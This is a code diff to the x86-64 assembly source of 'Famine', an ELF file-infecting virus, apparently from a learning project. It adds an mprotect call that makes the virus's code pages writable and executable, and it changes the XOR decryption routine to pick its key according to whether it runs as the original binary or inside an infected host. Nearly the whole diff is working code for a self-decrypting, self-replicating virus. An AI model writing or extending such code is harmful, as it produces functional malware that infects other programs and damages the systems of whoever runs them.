@@ -28,6 +28,7 @@ section .data
     msg_infected:         db "infected ", 0
     msg_already_infected: db "already infected", 10, 0
     proc_self_exe:        db "/proc/self/exe", 0
+    encryption_key_storage: times KEY_SIZE db 0  ; storage for encryption key (original Famine only)
 
 section .text
 global _start
@@ -68,6 +69,24 @@ _start:
     mov rax, [r15 + encryption_flag - virus_start]
     test rax, rax
     jz .skip_decrypt            ; if 0, not encrypted (original Famine)
+    
+    ; Need to make code segment writable before decryption
+    ; mprotect(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC)
+    ; First, align encrypt_start to page boundary (4KB = 0x1000)
+    lea rax, [r15 + encrypt_start - virus_start]
+    and rax, ~0xfff             ; Round down to page boundary
+    mov rdi, rax                ; addr = page-aligned encrypt_start
+    
+    ; Calculate length: from aligned address to end of virus_end (rounded up)
+    lea rax, [r15 + virus_end - virus_start]
+    add rax, 0xfff              ; Round up
+    and rax, ~0xfff             ; to page boundary
+    sub rax, rdi                ; len = aligned_end - aligned_start
+    mov rsi, rax                ; len
+    
+    mov edx, PROT_READ | PROT_WRITE | PROT_EXEC  ; prot = RWX
+    mov eax, SYS_MPROTECT
+    syscall
     
     ; Decrypt the virus code
     call decrypt_file
@@ -160,7 +179,8 @@ _start:
 ; decrypt_file - Decrypt virus code using XOR with key
 ; r15 = virus base address (already set by caller)
 ; This function decrypts the virus code from encrypt_start to virus_end
-; using the key stored at virus_end
+; For original Famine binary: uses key from encryption_key_storage in .bss
+; For infected binaries: uses key stored at virus_end
 ; MUST NOT BE ENCRYPTED - placed before encrypt_start
 ; ============================================
 decrypt_file:
@@ -169,13 +189,25 @@ decrypt_file:
     push rsi
     push rdi
     push rdx
+    push r8
     
     ; Get pointer to start of encrypted region
     lea rsi, [r15 + encrypt_start - virus_start]
     
-    ; Get pointer to key (stored at virus_end)
+    ; Check if we're the original Famine (original_entry_storage == 0)
+    mov r8, [r15 + original_entry_storage - virus_start]
+    test r8, r8
+    jnz .use_virus_key
+    
+    ; Original Famine: use encryption_key_storage from .bss
+    lea rdi, [rel encryption_key_storage]
+    jmp .do_decrypt
+    
+.use_virus_key:
+    ; Infected binary: use key at virus_end
     lea rdi, [r15 + virus_end - virus_start]
     
+.do_decrypt:
     ; Calculate size to decrypt
     mov rcx, virus_end - encrypt_start
     
@@ -202,6 +234,7 @@ decrypt_file:
     jmp .decrypt_loop
     
 .decrypt_done:
+    pop r8
     pop rdx
     pop rdi
     pop rsi
